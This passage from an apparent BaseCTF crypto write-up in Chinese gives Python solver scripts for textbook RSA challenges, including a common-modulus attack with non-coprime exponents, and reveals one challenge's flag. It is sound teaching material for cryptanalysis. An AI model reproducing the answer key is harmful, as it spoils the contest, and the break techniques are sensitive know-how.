style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.899108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.899108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.899108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.899108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight">∗</span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>可以通过网站在线分解</p><p>也可以直接利用sage中euler_phi()求解，就是时间有点久</p><blockquote><p><a href="http://www.factordb.com/index.php">factordb.com</a></p></blockquote><p>之后给了d就正常解了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>c = <span class="hljs-number">52453423663797600504896811946820841317615798875871627840172711423749946998217916744135290476795328543876098295227017753117609268701786914053599060330837226980969490439739651088710549890669593587642238827462108900683237797139569260570711611781514337884756698142193277516649805710242748531658979160170193283558</span><br>e = <span class="hljs-number">65537</span><br>d = <span class="hljs-number">54297831548863701092644190086258072883163378307246681513317422545902442650340916001357605211715836911877651782099787873046987096258918495734824011752504203578982947618784736181975847356304742402103468329660346526185908618978851982007496096394151821403282347897417590596861323293706611997134962231129075032641</span><br>x = <span class="hljs-number">40635864473997460751766935373772107585133301579524000836637683731949939348171187931595274511243052505604832873086269554842194695737052043633079044688826020656068356561856848814530947955429343483847291398607359454851926470168457852479044154798114087493843073091985855839008222762224952503563764527380033064437</span><br><br>phic=(<span class="hljs-number">2</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">3</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">73</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">3967</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">6373</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">95592293</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">216465863</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">4744823012787277141</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">48245998253859255581546561942142167304434549996919484957120717763726325509833409296170471619434291990255044694414983821250538266717293535917534918221352198192885071310932646412147737114561229291373456448363184353049796801297876664512630305475226391199481032049429</span>-<span class="hljs-number">1</span>)<br><span class="hljs-comment">#phic=euler_phi(c)</span><br>dc=gmpy2.invert(e,phic)<br>a=<span class="hljs-built_in">pow</span>(x,dc,c)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,a+c)))<br></code></pre></td></tr></table></figure><h3 id="exgcd"><a class="markdownIt-Anchor" href="#exgcd"></a> exgcd</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br><br>p=getPrime(<span class="hljs-number">1024</span>)<br>q=getPrime(<span class="hljs-number">1024</span>)<br><br>n=p*q<br>e1=<span class="hljs-number">3747</span><br>e2=<span class="hljs-number">2991</span><br><br>c1=<span class="hljs-built_in">pow</span>(m,e1,n)<br>c2=<span class="hljs-built_in">pow</span>(m,e2,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e1 =&quot;</span>,e1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e2 =&quot;</span>,e2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1 =&quot;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c2 =&quot;</span>,c2)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n = 27855350163093443890983002241607629119744539643165776358993469078731521668677421483556132628708836721737685936980427467856642738196111748018522018598646125626995613169001111504706363742194664774823604738939411512861441742683157275818500991834651769368178320088982759626122029956515159435424882855075032400667120376075618896752694718491438251810609878021717559466498493103257912108879328270813061231904227056671621363669388496383136964549879459562004569059185078204867346250733489663015417879915436157806942021693920206071715538430633494012923651469196048546309592946901609803631751035364478773126967010589504275776307</span><br><span class="hljs-string">e1 = 3747</span><br><span class="hljs-string">e2 = 2991</span><br><span class="hljs-string">c1 = 24426579024062518665031958216110619832653602343205488454298659533869220501923184793828421371206493659949730138867555889074137026401207985428160803910695088081370233571905915349589146504374710444468715701305061060934519410886010929009297226496448218819742287990364436349188987723637449590579092391100714056589967894609950537021838172987840638735592599678186555961654312442380755963257875487240962193060914793587712733601168204859917001269928487633954556221987632934190217367502677285906521385169669644977192556145782303526375491484736352799180747403161343130663661867413380222714012960607473395828938694285120527085083</span><br><span class="hljs-string">c2 = 6932145147126610816836065944280934160173362059462927112752295077225965836502881335565881607385328990881865436690904056577675885697508058289570333933837515526915707121125766720407153139160751343352211421901876051228566093038929625042619250168565502734932197817082848506826847112949495527533238122893297049985517280574646627011986403578166952789317461581409161873814203023736604394085875778774834314777046086921852377348590998381648241629124408514875110073073851913857329679268519229436092660959841766848676678740851087184214283196544821779336090434587905158006710112461778939184327386306992082433561460542130441825293</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>共模攻击，但$$e_1和e_2不互素$$</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mspace linebreak="newline"></mspace><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>2</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mspace linebreak="newline"></mspace><mtext>通过扩展欧几里得计算：</mtext><msub><mi>s</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>e</mi><mn>1</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>e</mi><mn>2</mn></msub><mo>=</mo><mi>s</mi><mspace linebreak="newline"></mspace><msubsup><mi>c</mi><mn>1</mn><msub><mi>s</mi><mn>1</mn></msub></msubsup><mo>∗</mo><msubsup><mi>c</mi><mn>2</mn><msub><mi>s</mi><mn>2</mn></msub></msubsup><mo>=</mo><msup><mi>m</mi><mrow><msub><mi>s</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>e</mi><mn>1</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo>=</mo><msup><mi>m</mi><mi>s</mi></msup></mrow><annotation encoding="application/x-tex">c_1=m^{e1}\mod n\\c_2=m^{e2}\mod n\\通过扩展欧几里得计算：s_1*e_1+s_2*e_2=s\\c_1^{s_1}*c_2^{s_2}=m^{s_1*e_1+s_2*e_2}=m^s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">扩</span><span class="mord cjk_fallback">展</span><span class="mord cjk_fallback">欧</span><span class="mord cjk_fallback">几</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">s</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.821331em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.821331em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span></span></span></span></p><p>最后得到的是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>e</mi><mn>1</mn><mo separator="true">,</mo><mi>e</mi><mn>2</mn><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">m^{gcd(e1,e2)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">d</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span>，最后开个根即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">27855350163093443890983002241607629119744539643165776358993469078731521668677421483556132628708836721737685936980427467856642738196111748018522018598646125626995613169001111504706363742194664774823604738939411512861441742683157275818500991834651769368178320088982759626122029956515159435424882855075032400667120376075618896752694718491438251810609878021717559466498493103257912108879328270813061231904227056671621363669388496383136964549879459562004569059185078204867346250733489663015417879915436157806942021693920206071715538430633494012923651469196048546309592946901609803631751035364478773126967010589504275776307</span><br>e1 = <span class="hljs-number">3747</span><br>e2 = <span class="hljs-number">2991</span><br>c1 = <span class="hljs-number">24426579024062518665031958216110619832653602343205488454298659533869220501923184793828421371206493659949730138867555889074137026401207985428160803910695088081370233571905915349589146504374710444468715701305061060934519410886010929009297226496448218819742287990364436349188987723637449590579092391100714056589967894609950537021838172987840638735592599678186555961654312442380755963257875487240962193060914793587712733601168204859917001269928487633954556221987632934190217367502677285906521385169669644977192556145782303526375491484736352799180747403161343130663661867413380222714012960607473395828938694285120527085083</span><br>c2 = <span class="hljs-number">6932145147126610816836065944280934160173362059462927112752295077225965836502881335565881607385328990881865436690904056577675885697508058289570333933837515526915707121125766720407153139160751343352211421901876051228566093038929625042619250168565502734932197817082848506826847112949495527533238122893297049985517280574646627011986403578166952789317461581409161873814203023736604394085875778774834314777046086921852377348590998381648241629124408514875110073073851913857329679268519229436092660959841766848676678740851087184214283196544821779336090434587905158006710112461778939184327386306992082433561460542130441825293</span><br>s,s1,s2=gcdext(e1,e2)<br><br>m=(<span class="hljs-built_in">pow</span>(c1,s1,n)*<span class="hljs-built_in">pow</span>(c2,s2,n))%n<br><br><span class="hljs-built_in">print</span>(long_to_bytes(iroot(m,s)[<span class="hljs-number">0</span>]))<br><span class="hljs-comment">#b&#x27;BaseCTF&#123;feb7e1ae-a8f7-4fc4-8d6d-945a45cc3f6d&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="wiener"><a class="markdownIt-Anchor" href="#wiener"></a> wiener?</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> decimal<br>flag=<span class="hljs-string">b&quot;BaseCTF&#123;&#125;&quot;</span><br>m = bytes_to_long(flag)<br><br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span 